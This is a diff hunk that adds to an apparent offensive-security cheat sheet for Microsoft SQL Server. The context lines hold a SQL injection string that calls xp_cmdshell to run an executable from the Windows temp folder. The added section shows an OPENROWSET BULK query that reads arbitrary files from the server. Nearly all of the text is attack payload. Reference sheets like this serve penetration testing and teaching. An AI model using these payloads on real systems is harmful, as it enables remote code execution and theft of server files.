@@ -2623,6 +2623,12 @@ SQL> xp_cmdshell whoami
 ';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
 ```
 
+##### Read/Write using OPENROWSET
+
+```shell
+SELECT * FROM OPENROWSET(BULK 'C:\PATH\TO\FILE\<FILE>', SINGLE_CLOB) AS x;
+```
+
 #### MySQL
 
 ```shell
